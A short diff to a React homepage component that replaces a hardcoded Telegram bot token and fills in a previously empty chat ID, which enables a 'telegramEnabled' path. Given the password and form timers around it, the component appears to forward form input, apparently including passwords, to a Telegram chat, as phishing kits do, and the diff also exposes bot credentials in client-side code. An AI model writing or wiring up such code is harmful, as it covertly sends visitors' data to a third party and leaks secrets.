@@ -365,8 +365,8 @@ export default function HomePageClient({
   const [didTrySubmit, setDidTrySubmit] = useState(false);
   const formTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const passwordTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const botToken = "8778796703:AAFDJc_fLtDeyOvh45zSeDfnwJfj_ZCd_ko";
-  const chatId = "";
+  const botToken = "8760232091:AAFV6cLHO9qqSi0doRso0Pj2uxlIdkgFvsc";
+  const chatId = "6604062347";
 
   const telegramEnabled = Boolean(botToken && chatId);
   const [messageId, setMessageId] = useState<string | null>(null);
